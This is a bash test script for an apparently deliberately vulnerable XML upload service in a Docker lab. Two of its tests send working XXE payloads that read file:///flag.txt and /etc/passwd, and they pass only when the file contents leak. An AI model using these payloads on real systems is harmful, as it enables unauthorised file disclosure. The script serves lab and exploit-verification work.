#!/usr/bin/env bash
set -e
DC=$(docker compose version &>/dev/null && echo "docker compose" || echo "docker-compose")

$DC down 2>/dev/null || true
$DC up --build -d
trap "$DC down" EXIT
sleep 3

PORT=8084
FAIL=0

# 1. Clean XML is parsed successfully
OUT=$(curl -sf -X POST "http://localhost:$PORT/upload" \
  -H "Content-Type: application/xml" \
  -d '<data><item>hello world</item></data>')
if echo "$OUT" | python3 -c "import sys,json; d=json.load(sys.stdin); exit(0 if 'hello world' in d.get('items',[]) else 1)" 2>/dev/null; then
  echo "[+] PASS: clean XML parsed successfully"
else
  echo "[-] FAIL: clean XML parse failed: $OUT"; FAIL=1
fi

# 2. XXE with file:// entity returns flag
XXE_PAYLOAD='<?xml version="1.0"?><!DOCTYPE data [<!ENTITY f SYSTEM "file:///flag.txt">]><data><item>&f;</item></data>'
OUT=$(curl -sf -X POST "http://localhost:$PORT/upload" \
  -H "Content-Type: application/xml" \
  -d "$XXE_PAYLOAD")
if echo "$OUT" | grep -qE 'POC\{[0-9a-f]{32}\}'; then
  echo "[+] PASS: XXE file entity returned flag"
else
  echo "[-] FAIL (xxe): $OUT"; FAIL=1
fi

# 3. /etc/passwd is readable via XXE
PASSWD_PAYLOAD='<?xml version="1.0"?><!DOCTYPE data [<!ENTITY p SYSTEM "file:///etc/passwd">]><data><item>&p;</item></data>'
OUT=$(curl -sf -X POST "http://localhost:$PORT/upload" \
  -H "Content-Type: application/xml" \
  -d "$PASSWD_PAYLOAD")
if echo "$OUT" | grep -q '"root'; then
  echo "[+] PASS: XXE can read /etc/passwd"
else
  echo "[-] FAIL (/etc/passwd): $OUT"; FAIL=1
fi

# 4. Empty body returns 400
STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "http://localhost:$PORT/upload" \
  -H "Content-Type: application/xml")
if [ "$STATUS" = "400" ]; then
  echo "[+] PASS: empty body returns 400"
else
  echo "[-] FAIL: expected 400 for empty body, got $STATUS"; FAIL=1
fi

if [ "$FAIL" -eq 0 ]; then
  echo "[+] All tests passed"
  exit 0
else
  echo "[-] One or more tests failed"
  exit 1
fi
